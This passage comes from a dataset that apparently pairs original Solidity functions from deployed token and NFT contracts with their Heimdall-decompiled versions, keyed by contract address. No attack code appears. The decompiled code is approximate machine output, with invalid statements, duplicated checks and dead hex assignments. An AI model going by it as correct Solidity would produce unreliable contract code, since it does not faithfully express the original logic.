   var_b = 0x20;\n        var_c = 0x10;\n        var_d = 0x496e636f727265637420616d6f756e7400000000000000000000000000000000;\n        require(!(bytes1(paused)), \"Minting unavaliable\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x13;\n        var_d = 0x4d696e74696e6720756e6176616c6961626c6500000000000000000000000000;\n        require(!(getGuaranteedWhitelistSupply > ~(competitveWhitelistInfo)), \"Claimed all avaliable times\");\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1b;\n        var_d = 0x436c61696d656420616c6c206176616c6961626c652074696d65730000000000;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1f;\n        var_d = 0x4e6f74206f6e207468652067756172616e746565642077686974656c69737400;\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x08;\n        var_d = 0x536f6c64204f7574000000000000000000000000000000000000000000000000;\n        require(!(block.timestamp > ownerb), \"Guaranteed whitelist minting closed\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x23;\n        var_d = 0x47756172616e746565642077686974656c697374206d696e74696e6720636c6f;\n        var_e = 0x7365640000000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEA96F358096DB436A74f5C974F59fdE3Bc5185e7", "original_solidity_code": "function setMaxSize(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {\r\n        uint256 newTx = _supplyTotal.mul(_buy).div(10000); uint256 newTransfer = _supplyTotal.mul(_sell).div(10000); uint256 newWallet = _supplyTotal.mul(_wallet).div(10000);\r\n        _maxxTrxSize = newTx; _maxxTransferSize = newTransfer; _maxxWalletSize = newWallet;\r\n        uint256 limit = totalSupply().mul(5).div(1000);\r\n        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, \"Max TXs and Max Wallet cannot be less than .5%\");\r\n    }", "heimdall_decompiled_code": "function setMaxSize(uint256 arg0, uint256 arg1, uint256 arg2) public {\n        require(msg.sender == (address(getOwner)), \"Ownable: Caller is not owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x1c;\n        var_d = 0x4f776e61626c653a2043616c6c6572206973206e6f74206f776e657200000000;\n        require((arg0 == ((arg0 * store_l) / store_l)) | !store_l);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require((arg1 == ((arg1 * store_l) / store_l)) | !store_l);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        require((arg2 == ((arg2 * store_l) / store_l)) | !store_l);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x2710);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        _maxxTrxSize = (arg0 * store_l) / 0x2710;\n        _maxxTransferSize = (arg1 * store_l) / 0x2710;\n        _maxxWalletSize = (arg2 * store_l) / 0x2710;\n        var_g = 0x18;\n        var_e = 0xdead;\n        require(!(store_l - store_n) > store_l);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n    }"}
{"contract_address": "0x0675693f486F11520F5b6814e290724cC6937312", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x0056aC5defc0F8380b9d2B351c3C23b23A852082", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(store_c > store_d, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_e == ((store_e * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_e * arg1) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(bytes1(transferDelayEnabled)), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(address(store_g) == (address(arg0)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(store_h)) == (address(arg0))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = tx.origin;\n        var_b = 0x05;\n        require(block.number > storage_map_b[var_a], \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x49;\n        var_m = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(store_h) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_h) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_h) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_h) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_h) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_e * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((store_e * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(((store_e * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((store_e * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (store_e * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_e * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((store_e * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        uint256 var_u = var_i.length;\n        uint256 var_v = 0;\n        var_w = var_n;\n        var_v = 0;\n        if (!(arg1 - ((store_e * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_c > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_h / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_c > store_l) {\n                if (0 - arg1) {\n                }\n                require(!((arg1 - ((store_e * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_c > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_g) == (address(arg0))) {\n            if (address(store_g) == (address(arg0))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xd3a031b4752eE83c310988Ad7277A7C2cD0bC631", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(store_k)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_d[var_a]);\n        store_c = 0x01000000000000000000000000000000000000000000 | (uint248(store_c));\n        require(!storage_map_d[var_a]);\n        require(!bytes1(store_c / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_g).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_g), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_g);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = storage_map_d[var_a];\n        address var_k = storage_map_d[var_a];\n        emit Approval(address(this), address(store_g), storage_map_d[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_d[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_g).code.length);\n        (bool success, bytes memory ret0) = address(store_g).Unresolved_791ac947(var_l); // call\n        store_c = uint248(store_c);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(store_k).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4c5CbB44F1F835E2BbE255d8dBFb91A364b0D36B", "original_solidity_code": "function setSalePhase(uint256 phase) external onlyOwner {\\n        salePhase = phase;\\n    }", "heimdall_decompiled_code": "function setSalePhase(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        salePhase = arg0;\n    }"}
{"contract_address": "0xFF5C43C4fADdF9A03BEdE1D0b276E7eC996504a1", "original_solidity_code": "function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner {\r\n        _swapTokensAtAmount = swapTokensAtAmount;\r\n    }", "heimdall_decompiled_code": "function setMinSwapTokensThreshold(uint256 arg0) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        _swapTokensAtAmount = arg0;\n    }"}
{"contract_address": "0xf14bcFb9213C0583632d65e80ac5B2Bd02c7D3d8", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x3fB31523Be4Efb297D343fD8227079C4A37aEbdF", "original_solidity_code": "function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public view {\n        require(arg0 == (address(arg0)));\n        if (address(msg.sender)) {\n            if (address(arg0)) {\n                if (arg1 > 0) {\n                    address var_a = address(msg.sender);\n                    var_b = 0x09;\n                    if (storage_map_d[var_a]) {\n                        if (storage_map_d[var_a]) {\n                            require(address(msg.sender), \"Transfer amount must be greater than zero\");\n                            require(address(arg0), \"Transfer amount must be greater than zero\");\n                            require(arg1 > 0, \"Transfer amount must be greater than zero\");\n                        }\n                        require(bytes1(storage_map_d[var_a]), \"Transfer amount must be greater than zero\");\n                        require(bytes1(storage_map_d[var_a]), \"Transfer amount must be greater than zero\");\n                        require(!(bytes1(storage_map_d[var_a])), \"Transfer amount must be greater than zero\");\n                        require(0, \"Transfer amount must be greater than zero\");\n                        require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                        require(!(address(uniswapV2Pair) == (address(msg.sender))), \"Transfer amount must be greater than zero\");\n                    }\n                    require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n                }\n                require(!(address(uniswapV2Pair) == (address(arg0))), \"Transfer amount must be greater than zero\");\n            }\n            require(0x01, \"Transfer amount must be greater than zero\");\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x04Ac04832dFeF1DFa133B242724D0a154C4a78Cb", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\\n        _approve(_msgSender(), spender, amount);\\n        return true;\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x10;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_f[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x921bfABc80E240B6e0780De1471110C7bE77d4E7", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0);\n        require(address(arg0) - 0);\n        require(arg1 > 0);\n        require(address(msg.sender) == (address(owner / 0x01)));\n        require(address(arg0) == (address(owner / 0x01)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a] / 0x01));\n        require(!bytes1(storage_map_b[var_a] / 0x01));\n        require(store_c > store_d, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_e == ((arg1 * store_e) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_e) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x21;\n        var_h = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_i = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_f = 0x40 + var_f;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_i = var_f.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(address(msg.sender) == (address(store_f / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_f / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_f / 0x01))), \"SafeMath: addition overflow\");\n        require(!(!(address(arg0)) == (address(store_f / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(arg0);\n        var_b = 0x03;\n        require(!(!bytes1(storage_map_b[var_a] / 0x01)), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_f / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_f / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_f / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_e) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + ((arg1 * store_e) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(storage_map_b[var_a] + ((arg1 * store_e) / 0x64) < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] + ((arg1 * store_e) / 0x64);\n        uint256 var_k = (arg1 * store_e) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_e) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_f = 0x40 + var_f;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_f = 0x40 + var_f;\n        var_p = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_e) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_r = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_s = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_t = var_f.length;\n        uint256 var_u = 0;\n        var_v = var_n;\n        var_u = 0;\n        if (!(arg1 - ((arg1 * store_e) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_c > store_h) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_f / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_c > store_j) {\n                if (arg1 - 0) {\n                }\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_e) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_c > store_j, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_l / 0x01))) {\n            if (address(arg0) == (address(store_l / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x29;\n        var_h = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_i = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 